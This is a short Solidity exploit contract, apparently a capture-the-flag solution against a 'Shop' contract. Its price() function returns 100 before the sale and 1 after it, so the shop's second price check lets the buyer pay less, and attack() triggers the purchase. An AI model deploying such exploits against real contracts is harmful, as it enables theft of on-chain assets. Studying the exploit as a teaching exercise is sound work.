```
contract Buyer{
    Shop public shop;

    constructor(address _shop) {
        shop = Shop(_shop);
    }

    function price() public view returns (uint256){
        if(!shop.isSold()){
            return 100;
        }
        return 1;
    }

    function attack()public {
        shop.buy();
    }
}
```
